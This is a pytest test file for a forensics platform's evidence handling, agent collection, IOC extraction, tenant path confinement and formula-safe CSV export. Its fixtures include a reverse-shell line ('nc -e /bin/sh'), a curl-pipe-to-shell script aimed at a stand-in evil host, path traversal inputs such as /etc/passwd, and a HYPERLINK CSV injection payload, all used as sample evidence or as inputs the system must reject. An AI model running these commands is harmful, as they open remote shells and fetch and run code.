"""Wave 3 (W3-D): DFIR evidence, verification, agent collection, IOC extraction, timeline.

Covers: uploads store the real bytes under ``<root>/<org>/<case>/`` with
SHA-256 / MD5 computed on write and a root-relative location; the custody
actor is the session user; verify re-hashes the stored file, compares with
the recorded hash and never overwrites it; every local read is confined to
the caller's tenant subtree (legacy rows pointing elsewhere are refused);
clients cannot register local paths; collection goes through endpoint agents
(``collect_*`` commands) with status from the command result, or reports
``awaiting_agent``; IOC extraction and timeline reconstruction run over the
stored artifacts and bytes and persist their results; the CSV export is
formula-safe; viewers cannot use the new write routes.
"""

from __future__ import annotations

import base64
import csv
import hashlib
import io
import os
import uuid
from pathlib import Path
from typing import Any

import pytest
from httpx import AsyncClient
from sqlalchemy import select
from sqlalchemy.ext.asyncio import AsyncSession

from src.agents.models import AgentCommand, EndpointAgent
from src.agents.service import AgentService
from src.api.v1.endpoints import dfir as dfir_endpoints
from src.core.csvsafe import csv_safe
from src.dfir.models import ForensicArtifact, ForensicEvidence, ForensicTimeline
from src.models.audit import AuditLog
from src.models.organization import Organization
from tests.helpers.tenancy import assert_tenant_isolated

BASE = "/api/v1/dfir"


@pytest.fixture(autouse=True)
def evidence_root(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> Path:
    root = tmp_path / "evidence-root"
    root.mkdir()
    monkeypatch.setattr(dfir_endpoints, "DFIR_UPLOAD_ROOT", str(root))
    return root


async def _case(client: AsyncClient, headers: dict[str, str], severity: str = "medium") -> str:
    resp = await client.post(
        f"{BASE}/cases",
        json={"case_number": f"W3-{uuid.uuid4().hex[:10]}", "title": "wave3", "severity": severity},
        headers=headers,
    )
    assert resp.status_code == 201, resp.text
    return resp.json()["id"]


async def _upload(client: AsyncClient, case_id: str, headers: dict[str, str], data: bytes, name: str = "a.log") -> dict[str, Any]:
    resp = await client.post(
        f"{BASE}/cases/{case_id}/evidence/upload",
        files={"file": (name, data, "application/octet-stream")},
        data={"collector": "someone-else", "evidence_type": "log_files"},
        headers=headers,
    )
    assert resp.status_code == 201, resp.text
    return resp.json()


async def _agent(db: AsyncSession, org_id: str, hostname: str, caps: list[str]) -> EndpointAgent:
    agent = EndpointAgent(hostname=hostname, status="active", capabilities=caps, organization_id=org_id)
    db.add(agent)
    await db.commit()
    return agent


def _error(resp: Any) -> str:
    detail = resp.json().get("detail")
    return detail.get("error", "") if isinstance(detail, dict) else str(detail)


# ---------------------------------------------------------------------------
# Upload, custody, verify
# ---------------------------------------------------------------------------


async def test_upload_stores_bytes_under_the_tenant_with_hashes_and_session_actor(
    client: AsyncClient, org_a: Organization, org_a_user: Any,
    org_a_headers: dict[str, str], evidence_root: Path,
) -> None:
    org_id, actor = org_a.id, org_a_user.full_name or org_a_user.email
    case_id = await _case(client, org_a_headers)
    data = b"Failed password for root from 198.51.100.23 port 22\n"
    ev = await _upload(client, case_id, org_a_headers, data)

    assert ev["original_hash_sha256"] == hashlib.sha256(data).hexdigest()
    assert ev["original_hash_md5"] == hashlib.md5(data).hexdigest()
    assert ev["file_size_bytes"] == len(data)
    assert ev["storage_kind"] == "local"
    location = ev["storage_location"]
    assert not os.path.isabs(location) and location.startswith(f"{org_id}/{case_id}/")
    assert (evidence_root / location).read_bytes() == data
    first = ev["chain_of_custody_log"]["entries"][0]
    assert first["actor"] == actor and first["reported_collector"] == "someone-else"
    assert first["hash_md5"] == hashlib.md5(data).hexdigest()

    dl = await client.get(f"{BASE}/evidence/{ev['id']}/download", headers=org_a_headers)
    assert dl.status_code == 200 and dl.content == data


async def test_verify_rehashes_the_stored_file_and_never_overwrites(
    client: AsyncClient, db_session: AsyncSession, org_a_headers: dict[str, str], evidence_root: Path,
) -> None:
    case_id = await _case(client, org_a_headers)
    data = b"original evidence bytes"
    ev = await _upload(client, case_id, org_a_headers, data)
    sha = hashlib.sha256(data).hexdigest()

    ok = await client.post(f"{BASE}/evidence/{ev['id']}/verify", json={}, headers=org_a_headers)
    assert ok.status_code == 200, ok.text
    body = ok.json()
    assert body["is_verified"] is True
    assert body["verification"] == {
        "algorithm": "sha256", "reference": "file", "computed_hash": sha, "stored_hash": sha,
        "file_matches_stored_hash": True, "claimed_hash_matches": None, "is_valid": True,
    }

    md5 = await client.post(
        f"{BASE}/evidence/{ev['id']}/verify",
        json={"hash_algorithm": "md5", "evidence_hash": hashlib.md5(data).hexdigest()}, headers=org_a_headers,
    )
    assert md5.json()["is_verified"] is True and md5.json()["verification"]["claimed_hash_matches"] is True

    # Tamper with the stored bytes: verification fails, the recorded hash stays.
    (evidence_root / ev["storage_location"]).write_bytes(b"tampered")
    bad = await client.post(f"{BASE}/evidence/{ev['id']}/verify", json={"evidence_hash": sha}, headers=org_a_headers)
    assert bad.status_code == 200
    assert bad.json()["is_verified"] is False
    assert bad.json()["verification"]["file_matches_stored_hash"] is False
    assert bad.json()["original_hash_sha256"] == sha
    assert bad.json()["chain_of_custody_log"]["entries"][-1]["action"] == "verification_failed"

    # A missing file fails verification too.
    (evidence_root / ev["storage_location"]).unlink()
    gone = await client.post(f"{BASE}/evidence/{ev['id']}/verify", json={"evidence_hash": sha}, headers=org_a_headers)
    assert gone.status_code == 200 and gone.json()["is_verified"] is False
    row = (await db_session.execute(select(ForensicEvidence).where(ForensicEvidence.id == ev["id"]))).scalar_one()
    await db_session.refresh(row)
    assert row.original_hash_sha256 == sha


async def test_remote_evidence_without_a_claim_cannot_be_verified(
    client: AsyncClient, org_a_headers: dict[str, str],
) -> None:
    case_id = await _case(client, org_a_headers)
    resp = await client.post(
        f"{BASE}/evidence",
        json={"case_id": case_id, "evidence_type": "file", "source_device": "h", "storage_location": "s3://b/o",
              "original_hash_sha256": "a" * 64},
        headers=org_a_headers,
    )
    ev_id = resp.json()["id"]
    assert resp.json()["storage_kind"] == "remote"
    none = await client.post(f"{BASE}/evidence/{ev_id}/verify", json={}, headers=org_a_headers)
    assert none.status_code == 409 and _error(none) == "nothing_to_compare"
    claim = await client.post(f"{BASE}/evidence/{ev_id}/verify", json={"evidence_hash": "a" * 64}, headers=org_a_headers)
    assert claim.json()["is_verified"] is True and claim.json()["verification"]["reference"] == "stored_hash"


# ---------------------------------------------------------------------------
# Tenant confinement of local reads
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    "location",
    ["/etc/passwd", "relative/file.bin", "file:///etc/passwd", "ORGB/case/x.bin", "../outside.bin"],
)
async def test_clients_cannot_register_local_or_managed_paths(
    client: AsyncClient, org_a_headers: dict[str, str], org_b: Organization, evidence_root: Path, location: str,
) -> None:
    case_id = await _case(client, org_a_headers)
    location = location.replace("ORGB", org_b.id)
    for loc in (location, str(evidence_root / org_b.id / "case" / "x.bin")):
        resp = await client.post(
            f"{BASE}/evidence",
            json={"case_id": case_id, "evidence_type": "file", "source_device": "h", "storage_location": loc},
            headers=org_a_headers,
        )
        assert resp.status_code == 400, (loc, resp.text)
        assert _error(resp) == "invalid_storage_location"


async def test_a_row_pointing_into_another_tenants_subtree_is_refused(
    client: AsyncClient, db_session: AsyncSession, org_a: Organization, org_b: Organization,
    org_a_headers: dict[str, str], evidence_root: Path,
) -> None:
    org_a_id, org_b_id = org_a.id, org_b.id
    victim = evidence_root / org_b_id / "case-b" / "secret.bin"
    victim.parent.mkdir(parents=True)
    victim.write_bytes(b"org B secret 203.0.113.99 evil.example.com")
    case_id = await _case(client, org_a_headers)
    for location in (str(victim), f"{org_b_id}/case-b/secret.bin", f"{org_a_id}/../{org_b_id}/case-b/secret.bin"):
        row = ForensicEvidence(
            case_id=case_id, evidence_type="file", source_device="legacy", acquisition_method="manual",
            storage_location=location, organization_id=org_a_id,
            original_hash_sha256=hashlib.sha256(victim.read_bytes()).hexdigest(), chain_of_custody_log={"entries": []},
        )
        db_session.add(row)
        await db_session.commit()
        row_id = row.id

        dl = await client.get(f"{BASE}/evidence/{row_id}/download", headers=org_a_headers)
        assert dl.status_code == 403 and _error(dl) == "evidence_path_outside_tenant_root", location
        assert b"org B secret" not in dl.content
        vr = await client.post(f"{BASE}/evidence/{row_id}/verify", json={}, headers=org_a_headers)
        assert vr.status_code == 403 and _error(vr) == "evidence_path_outside_tenant_root"

    scan = await client.post(f"{BASE}/cases/{case_id}/artifacts/extract-iocs", headers=org_a_headers)
    assert scan.status_code == 200, scan.text
    body = scan.json()
    assert body["evidence_files_scanned"] == 0
    assert {s["reason"] for s in body["evidence_skipped"]} == {"evidence_path_outside_tenant_root"}
    assert "203.0.113.99" not in body["iocs"]["ipv4_addresses"]

    # The refused download left no "accessed" custody entry.
    rows = (await db_session.execute(select(ForensicEvidence).where(ForensicEvidence.case_id == case_id))).scalars().all()
    for r in rows:
        await db_session.refresh(r)
        assert all(e["action"] != "accessed_download" for e in r.chain_of_custody_log["entries"])


async def test_another_org_cannot_read_verify_extract_or_export(
    client: AsyncClient, org_a_headers: dict[str, str], org_b_headers: dict[str, str],
) -> None:
    case_id = await _case(client, org_a_headers)
    ev = await _upload(client, case_id, org_a_headers, b"10.0.0.1 secret")
    for method, path, body in [
        ("GET", f"{BASE}/evidence/{ev['id']}", None),
        ("GET", f"{BASE}/evidence/{ev['id']}/download", None),
        ("POST", f"{BASE}/evidence/{ev['id']}/verify", {}),
        ("POST", f"{BASE}/cases/{case_id}/artifacts/extract-iocs", None),
        ("POST", f"{BASE}/cases/{case_id}/timeline/export", None),
        ("POST", f"{BASE}/cases/{case_id}/timeline/reconstruct", None),
        ("POST", f"{BASE}/cases/{case_id}/evidence/collect", {"hostname": "h", "collection_type": "process_list"}),
    ]:
        await assert_tenant_isolated(client, method, path, org_b_headers, json=body)


# ---------------------------------------------------------------------------
# Collection through endpoint agents
# ---------------------------------------------------------------------------


async def test_collection_without_an_agent_is_awaiting_agent_and_creates_nothing(
    client: AsyncClient, db_session: AsyncSession, org_a: Organization, org_a_headers: dict[str, str],
) -> None:
    org_id = org_a.id
    case_id = await _case(client, org_a_headers)
    resp = await client.post(
        f"{BASE}/cases/{case_id}/evidence/collect",
        json={"hostname": "ws-unknown", "collection_type": "process_list"}, headers=org_a_headers,
    )
    assert resp.status_code == 200, resp.text
    assert resp.json()["status"] == "awaiting_agent" and resp.json()["evidence"] is None
    assert "ws-unknown" in resp.json()["detail"]
    count = (await db_session.execute(select(ForensicEvidence).where(ForensicEvidence.case_id == case_id))).scalars().all()
    assert count == []
    audit = (await db_session.execute(
        select(AuditLog).where(AuditLog.action == "dfir_collect_process_list", AuditLog.organization_id == org_id),
    )).scalars().all()
    assert len(audit) == 1 and audit[0].success is False


async def test_agent_lacking_ir_capability_is_awaiting_agent(
    client: AsyncClient, db_session: AsyncSession, org_a: Organization, org_a_headers: dict[str, str],
) -> None:
    await _agent(db_session, org_a.id, "bas-host", ["bas"])
    case_id = await _case(client, org_a_headers)
    resp = await client.post(
        f"{BASE}/cases/{case_id}/evidence/collect",
        json={"hostname": "bas-host", "collection_type": "file", "path": "/etc/hosts"}, headers=org_a_headers,
    )
    assert resp.json()["status"] == "awaiting_agent" and "capability" in resp.json()["detail"]


async def test_process_list_collection_follows_the_command_result(
    client: AsyncClient, db_session: AsyncSession, org_a: Organization, org_a_headers: dict[str, str],
    evidence_root: Path,
) -> None:
    org_id = org_a.id
    agent = await _agent(db_session, org_id, "ws-01", ["ir"])
    agent_id = agent.id
    case_id = await _case(client, org_a_headers)
    resp = await client.post(
        f"{BASE}/cases/{case_id}/evidence/collect",
        json={"hostname": "WS-01", "collection_type": "process_list"}, headers=org_a_headers,
    )
    assert resp.status_code == 202, resp.text
    body = resp.json()
    assert body["status"] == "pending" and body["agent_hostname"] == "ws-01"
    ev_id, cmd_id = body["evidence"]["id"], body["command_id"]
    assert body["evidence"]["collection_status"] == "pending" and body["evidence"]["storage_kind"] == "none"
    cmd = (await db_session.execute(select(AgentCommand).where(AgentCommand.id == cmd_id))).scalar_one()
    assert cmd.action == "collect_process_list" and cmd.organization_id == org_id

    # Still pending until the agent reports.
    listed = await client.get(f"{BASE}/cases/{case_id}/evidence", headers=org_a_headers)
    assert listed.json()["items"][0]["collection_status"] == "pending"

    stdout = "PID PPID USER COMM ARGS\n1 0 root init /sbin/init\n4242 1 www nc nc -e /bin/sh 198.51.100.7 4444\n"
    agent_row = (await db_session.execute(select(EndpointAgent).where(EndpointAgent.id == agent_id))).scalar_one()
    cmd.status = "dispatched"
    await AgentService(db_session).ingest_result(agent=agent_row, command_id=cmd_id, status="success", stdout=stdout)
    await db_session.commit()

    got = await client.get(f"{BASE}/evidence/{ev_id}", headers=org_a_headers)
    ev = got.json()
    assert ev["collection_status"] == "collected"
    assert ev["original_hash_sha256"] == hashlib.sha256(stdout.encode()).hexdigest()
    assert ev["original_hash_md5"] == hashlib.md5(stdout.encode()).hexdigest()
    assert (evidence_root / ev["storage_location"]).read_text() == stdout
    assert ev["storage_location"].startswith(f"{org_id}/{case_id}/")
    assert ev["chain_of_custody_log"]["entries"][-1]["actor"] == "agent:ws-01"

    # The collected bytes feed IOC extraction.
    scan = await client.post(f"{BASE}/cases/{case_id}/artifacts/extract-iocs", headers=org_a_headers)
    assert "198.51.100.7" in scan.json()["iocs"]["ipv4_addresses"]


async def test_file_collection_failure_and_memory_dump_approval(
    client: AsyncClient, db_session: AsyncSession, org_a: Organization, org_a_headers: dict[str, str],
    evidence_root: Path,
) -> None:
    from src.dfir.tasks import reconcile_agent_collections

    org_id = org_a.id
    agent = await _agent(db_session, org_id, "srv-9", ["ir"])
    agent_id = agent.id
    case_id = await _case(client, org_a_headers)

    bad = await client.post(
        f"{BASE}/cases/{case_id}/evidence/collect", json={"hostname": "srv-9", "collection_type": "file"},
        headers=org_a_headers,
    )
    assert bad.status_code == 400 and _error(bad) == "invalid_collection_request"

    ok = await client.post(
        f"{BASE}/cases/{case_id}/evidence/collect",
        json={"hostname": "srv-9", "collection_type": "file", "path": "/tmp/drop.sh"}, headers=org_a_headers,
    )
    fail = await client.post(
        f"{BASE}/cases/{case_id}/evidence/collect",
        json={"hostname": "srv-9", "collection_type": "file", "path": "/root/x"}, headers=org_a_headers,
    )
    dump = await client.post(
        f"{BASE}/cases/{case_id}/evidence/collect",
        json={"hostname": "srv-9", "collection_type": "memory_dump", "pid": 4242}, headers=org_a_headers,
    )
    assert dump.status_code == 202 and dump.json()["status"] == "awaiting_approval"

    content = b"#!/bin/sh\ncurl http://evil.example.net/p | sh\n"
    agent_row = (await db_session.execute(select(EndpointAgent).where(EndpointAgent.id == agent_id))).scalar_one()
    svc = AgentService(db_session)
    for resp, status_, kwargs in (
        (ok, "success", {"artifacts": {
            "path": "/tmp/drop.sh", "size_bytes": len(content), "sha256": hashlib.sha256(content).hexdigest(),
            "content_base64": base64.b64encode(content).decode()}}),
        (fail, "error", {"stderr": "permission denied"}),
    ):
        cmd = (await db_session.execute(select(AgentCommand).where(AgentCommand.id == resp.json()["command_id"]))).scalar_one()
        cmd.status = "dispatched"
        await svc.ingest_result(agent=agent_row, command_id=cmd.id, status=status_, **kwargs)
    await db_session.commit()

    out = await reconcile_agent_collections(db_session, root=str(evidence_root))
    assert out == {"collected": 1, "collected_on_host": 0, "failed": 1, "pending": 1, "truncated": False}

    rows = {
        r.id: r for r in (await db_session.execute(select(ForensicEvidence).where(ForensicEvidence.case_id == case_id))).scalars()
    }
    collected = rows[ok.json()["evidence"]["id"]]
    assert collected.collection_status == "collected"
    assert (evidence_root / collected.storage_location).read_bytes() == content
    assert collected.chain_of_custody_log["entries"][-1]["agent_hash_matches"] is True
    failed = rows[fail.json()["evidence"]["id"]]
    assert failed.collection_status == "failed" and failed.collection_error == "permission denied"
    assert rows[dump.json()["evidence"]["id"]].collection_status == "awaiting_approval"

    dash = await client.get(f"{BASE}/dashboard/metrics", headers=org_a_headers)
    assert dash.json()["collections_pending"] == 1


# ---------------------------------------------------------------------------
# IOC extraction, timeline reconstruction and export
# ---------------------------------------------------------------------------


async def test_ioc_extraction_persists_results_on_stored_material(
    client: AsyncClient, db_session: AsyncSession, org_a_headers: dict[str, str],
) -> None:
    case_id = await _case(client, org_a_headers)
    ev = await _upload(client, case_id, org_a_headers, b"\x00\x01beacon to c2.badhost.org from 192.0.2.44\x00")
    art = await client.post(
        f"{BASE}/cases/{case_id}/artifacts",
        json={"evidence_id": ev["id"], "artifact_type": "browser_history",
              "artifact_data": {"url": "https://phish.example.org/login", "visited": "2026-10-01T10:00:00Z"}},
        headers=org_a_headers,
    )
    assert art.status_code == 201, art.text

    resp = await client.post(f"{BASE}/cases/{case_id}/artifacts/extract-iocs", headers=org_a_headers)
    body = resp.json()
    assert resp.status_code == 200, resp.text
    assert "192.0.2.44" in body["iocs"]["ipv4_addresses"]
    assert "c2.badhost.org" in body["iocs"]["domains"]
    assert "https://phish.example.org/login" in body["iocs"]["urls"]
    assert body["iocs_extracted"] == body["total_extracted"] > 0
    assert body["artifacts_scanned"] == 1 and body["evidence_files_scanned"] == 1

    listed = await client.get(f"{BASE}/cases/{case_id}/artifacts", headers=org_a_headers)
    by_type = {a["artifact_type"]: a for a in listed.json()["items"]}
    assert by_type["browser_history"]["ioc_extracted"]["urls"] == ["https://phish.example.org/login"]
    assert by_type["evidence_ioc_scan"]["ioc_count"] >= 2

    # Re-running updates instead of duplicating the per-evidence record.
    await client.post(f"{BASE}/cases/{case_id}/artifacts/extract-iocs", headers=org_a_headers)
    scans = (await db_session.execute(
        select(ForensicArtifact).where(ForensicArtifact.case_id == case_id, ForensicArtifact.artifact_type == "evidence_ioc_scan"),
    )).scalars().all()
    assert len(scans) == 1


async def test_timeline_reconstruction_and_formula_safe_csv_export(
    client: AsyncClient, db_session: AsyncSession, org_a_headers: dict[str, str],
) -> None:
    case_id = await _case(client, org_a_headers)
    ev = await _upload(client, case_id, org_a_headers, b"auth.log bytes")
    await client.post(
        f"{BASE}/cases/{case_id}/artifacts",
        json={"evidence_id": ev["id"], "artifact_type": "event_log",
              "artifact_data": {"records": [
                  {"timestamp": "2026-10-01T08:00:00Z", "event_id": 4625},
                  {"timestamp": 1759309200, "event_id": 4624},
                  {"no_time": True},
              ]}},
        headers=org_a_headers,
    )
    first = await client.post(f"{BASE}/cases/{case_id}/timeline/reconstruct", headers=org_a_headers)
    assert first.status_code == 200, first.text
    assert first.json()["from_custody"] == 1 and first.json()["from_artifacts"] == 2
    again = await client.post(f"{BASE}/cases/{case_id}/timeline/reconstruct", headers=org_a_headers)
    assert again.json()["created"] == 0 and again.json()["already_present"] == 3

    await client.post(
        f"{BASE}/cases/{case_id}/timeline/events",
        json={"event_timestamp": "2026-10-02T00:00:00Z", "event_type": "note", "source": "analyst",
              "description": '=HYPERLINK("http://evil.example","click")'},
        headers=org_a_headers,
    )
    js = await client.post(f"{BASE}/cases/{case_id}/timeline/export", headers=org_a_headers)
    assert js.json()["event_count"] == 4
    exported = await client.post(f"{BASE}/cases/{case_id}/timeline/export", params={"format": "csv"}, headers=org_a_headers)
    assert exported.status_code == 200 and exported.headers["content-type"].startswith("text/csv")
    rows = list(csv.DictReader(io.StringIO(exported.text)))
    assert len(rows) == 4
    note = next(r for r in rows if r["event_type"] == "note")
    assert note["description"] == "'" + '=HYPERLINK("http://evil.example","click")'
    assert csv_safe("-1") == "'-1" and csv_safe("plain") == "plain" and csv_safe(None) is None and csv_safe(5) == 5
    stored = (await db_session.execute(select(ForensicTimeline).where(ForensicTimeline.case_id == case_id))).scalars().all()
    assert len(stored) == 4


async def test_case_list_counts_and_dashboard_severities(
    client: AsyncClient, org_a_headers: dict[str, str],
) -> None:
    case_id = await _case(client, org_a_headers, severity="critical")
    await _case(client, org_a_headers, severity="high")
    await _upload(client, case_id, org_a_headers, b"x")
    cases = await client.get(f"{BASE}/cases", headers=org_a_headers)
    assert next(c for c in cases.json()["items"] if c["id"] == case_id)["evidence_count"] == 1
    dash = (await client.get(f"{BASE}/dashboard/metrics", headers=org_a_headers)).json()
    assert dash["critical_cases"] == 1 and dash["high_cases"] == 1


async def test_viewers_cannot_use_the_new_write_routes(
    client: AsyncClient, org_a_headers: dict[str, str], viewer_headers: dict[str, str],
) -> None:
    case_id = await _case(client, org_a_headers)
    for method, path, body in [
        ("POST", f"{BASE}/cases/{case_id}/evidence/collect", {"hostname": "h", "collection_type": "process_list"}),
        ("POST", f"{BASE}/cases/{case_id}/timeline/reconstruct", None),
        ("POST", f"{BASE}/cases/{case_id}/artifacts/extract-iocs", None),
    ]:
        resp = await client.request(method, path, json=body, headers=viewer_headers)
        assert resp.status_code == 403, f"{method} {path}: {resp.status_code}"
    assert (await client.post(f"{BASE}/cases/{case_id}/timeline/export", headers=viewer_headers)).status_code == 200


def test_migration_028_adds_the_collection_columns() -> None:
    import ast

    path = Path(__file__).resolve().parents[2] / "alembic" / "versions" / "028_dfir_collection_honeytoken_triggers.py"
    tree = ast.parse(path.read_text(encoding="utf-8"))
    values = {
        node.target.id if isinstance(node, ast.AnnAssign) else node.targets[0].id: node.value
        for node in tree.body
        if isinstance(node, (ast.Assign, ast.AnnAssign))
        and isinstance(node.target if isinstance(node, ast.AnnAssign) else node.targets[0], ast.Name)
    }
    assert ast.literal_eval(values["revision"]) == "028"
    assert ast.literal_eval(values["down_revision"]) == "027"
    assert set(ast.literal_eval(values["NEW_EVIDENCE_COLUMNS"])) <= set(ForensicEvidence.__table__.c.keys())
    assert "honey_token_triggers" == ast.literal_eval(values["TRIGGERS"])
